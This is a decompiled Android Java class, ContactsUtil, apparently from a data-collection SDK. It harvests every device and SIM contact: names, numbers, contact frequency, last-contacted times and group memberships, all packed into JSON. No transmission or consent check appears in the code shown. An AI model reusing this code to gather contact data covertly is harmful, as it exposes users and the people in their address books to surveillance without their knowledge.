//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.sxsdk.collection.util;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.Groups;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

public class ContactsUtil {
    private Context mContext;
    private final String TYPE_DEVIECE = "device";
    private final String TYPE_SIM = "sim";
    private String[] PHONES_PROJECTION = new String[]{"display_name", "data1", "times_contacted", "last_time_contacted", "photo_id", "contact_id"};
    private final String LIMIT_PARAM_KEY = "limit";

    public ContactsUtil(Context context) {
        this.mContext = context;
    }

    public JSONArray getContactsInfo() {
        List<ContactModel> list = this.queryContacts(0, -1);
        JSONArray contacts = new JSONArray();
        if (list != null && !list.isEmpty()) {
            Iterator var3 = list.iterator();

            while(var3.hasNext()) {
                ContactModel item = (ContactModel)var3.next();
                JSONObject contact = new JSONObject();
                try {
                    contact.put("name", RDataUtil.filterOffUtf8Mb4(item.getName()));
                    contact.put("mobile", RDataUtil.filterOffUtf8Mb4(item.getMobile()));
                    contact.put("times_contacted", item.getTimes_contacted());
                    contact.put("last_time_contacted", item.getLast_time_contacted());
                    contact.put("up_time", item.getUp_time());
                    contact.put("last_time_used", item.getLast_time_used());
                    contact.put("source", item.getSource() != null ? item.getSource() : "");
                    contact.put("group", this.queryGroups(item.getId()));
                    contacts.add(contact);
                } catch (Exception var7) {
                }
            }
        }
        return contacts;
    }

    private List<ContactModel> queryContacts(int id, int limit) {
        ArrayList allFriendInfoList = new ArrayList();

        try {
            allFriendInfoList.addAll(this.fillDetailInfo(id, limit));
            allFriendInfoList.addAll(this.getSimContactInfoList());
            return allFriendInfoList;
        } catch (Exception var8) {
            var8.printStackTrace();
            return allFriendInfoList;
        } finally {
        }
    }

    private ArrayList<ContactModel> getSimContactInfoList() {
        ArrayList<ContactModel> simFriendInfos = new ArrayList();
        TelephonyManager manager = (TelephonyManager)this.mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (manager != null && manager.getSimState() != 5) {
            return simFriendInfos;
        } else {
            ContentResolver resolver = this.mContext.getContentResolver();
            Uri uri = Uri.parse("content://icc/adn");
            Cursor phoneCursor = resolver.query(uri, this.PHONES_PROJECTION, (String)null, (String[])null, (String)null);

            while(phoneCursor != null && phoneCursor.moveToNext()) {
                int columnIndex = phoneCursor.getColumnIndex("_id");
                long id = phoneCursor.getLong(columnIndex);
                String phoneNumber = phoneCursor.getString(1);
                if (!TextUtils.isEmpty(phoneNumber)) {
                    String contactName = phoneCursor.getString(0);
                    ContactModel contactModel = new ContactModel();
                    contactModel.setName(contactName);
                    contactModel.setMobile(phoneNumber);
                    contactModel.setSource("sim");
                    contactModel.setId(id);
                    simFriendInfos.add(contactModel);
                }
            }
            if (phoneCursor != null) {
                phoneCursor.close();
            }
            return simFriendInfos;
        }
    }

    private ArrayList<ContactModel> fillDetailInfo(int id, int limit) {
        ArrayList<ContactModel> phoneFriendInfoList = new ArrayList();
        ContentResolver cr = this.mContext.getContentResolver();
        String[] projection = new String[]{"_id", "has_phone_number", "display_name"};
        String selection = "_id > " + id;
        String sort = "_id";
        Uri queryUri = limit > 0 ? Contacts.CONTENT_URI.buildUpon().appendQueryParameter("limit", String.valueOf(limit)).build() : Contacts.CONTENT_URI;
        Cursor cursor = cr.query(queryUri, projection, selection, null, sort);
        if (cursor != null && cursor.getCount() > 0) {
            while(true) {
                boolean hasPhone;
                String displayName;
                ContactModel contactModel;
                String phoneNumber;
                while(true) {
                    if (!cursor.moveToNext()) {
                        return phoneFriendInfoList;
                    }

                    queryUri = Phone.CONTENT_URI;
                    selection = "contact_id = ? ";
                    String[] args = new String[1];
                    StringBuilder builder = new StringBuilder();
                    int columnIndex = cursor.getColumnIndex("_id");
                    long rawId = cursor.getLong(columnIndex);
                    int hasPhoneColumnIndex = cursor.getColumnIndex("has_phone_number");
                    hasPhone = hasPhoneColumnIndex > 0 && cursor.getInt(hasPhoneColumnIndex) > 0;
                    int displayNameColumnIndex = cursor.getColumnIndex("display_name");
                    displayName = cursor.getString(displayNameColumnIndex);
                    contactModel = new ContactModel();
                    contactModel.setId(rawId);
                    phoneNumber = "";
                    if (!hasPhone) {
                        break;
                    }

                    args[0] = String.valueOf(rawId);
                    List projectionList;
                    if (VERSION.SDK_INT >= 18) {
                        projectionList = Arrays.asList("data1", "last_time_contacted", "last_time_used", "times_used", "times_contacted", "contact_last_updated_timestamp");
                    } else {
                        projectionList = Arrays.asList("data1", "times_contacted");
                    }

                    String[] projection2 = (String[])((String[])projectionList.toArray());
                    Cursor phoneCur = cr.query(queryUri, projection2, selection, args, (String)null);
                    if (phoneCur != null && phoneCur.getCount() > 0) {
                        builder.delete(0, builder.length());

                        while(phoneCur.moveToNext()) {
                            int timesContactsColumnIndex = phoneCur.getColumnIndex("times_contacted");
                            contactModel.setTimes_contacted(phoneCur.getString(timesContactsColumnIndex));
                            if (VERSION.SDK_INT >= 18) {
                                int lastTimeUsedColumnIndex = phoneCur.getColumnIndex("last_time_used");
                                contactModel.setLast_time_used(String.valueOf(phoneCur.getLong(lastTimeUsedColumnIndex)));
                                int lastTimeContactedColumnIndex = phoneCur.getColumnIndex("last_time_contacted");
                                contactModel.setLast_time_contacted(String.valueOf(phoneCur.getLong(lastTimeContactedColumnIndex)));
                                int lastUpdateTimeUsedColumnIndex = phoneCur.getColumnIndex("contact_last_updated_timestamp");
                                contactModel.setUp_time(String.valueOf(phoneCur.getLong(lastUpdateTimeUsedColumnIndex)));
                            }

                            columnIndex = phoneCur.getColumnIndex("data1");
                            if (columnIndex >= 0) {
                                String phone = phoneCur.getString(columnIndex);
                                if (!RDataUtil.isValidChinaChar(phone)) {
                                    builder.append(phone);
                                    if (!phoneCur.isLast()) {
                                        builder.append(",");
                                    }
                                }
                            }
                        }

                        phoneCur.close();
                        phoneNumber = builder.toString();
                        break;
                    }
                }

                contactModel.setName(displayName);
                contactModel.setSource("device");
                if (hasPhone) {
                    contactModel.setMobile(phoneNumber);
                } else {
                    contactModel.setMobile(displayName);
                }

                phoneFriendInfoList.add(contactModel);
            }
        } else {
            return phoneFriendInfoList;
        }
    }

    private ArrayList<String> queryGroups(Long rawId) {
        ArrayList<String> groupNameArray = new ArrayList();
        ContentResolver cr = this.mContext.getContentResolver();
        String[] projection = new String[]{"data1"};
        Cursor groupCursor = cr.query(Data.CONTENT_URI, projection, "mimetype='vnd.android.cursor.item/group_membership' AND raw_contact_id = " + rawId, (String[])null, (String)null);

        while(groupCursor != null && groupCursor.moveToNext()) {
            Cursor groupNameCursor = cr.query(Groups.CONTENT_URI, (String[]) Arrays.asList("title").toArray(new String[0]), "_id=" + groupCursor.getInt(0), (String[])null, (String)null);
            if (groupNameCursor != null) {
                groupNameCursor.moveToNext();
                groupNameArray.add(groupNameCursor.getString(0));
                groupNameCursor.close();
            }
        }

        if (groupCursor != null) {
            groupCursor.close();
        }

        return groupNameArray;
    }
}
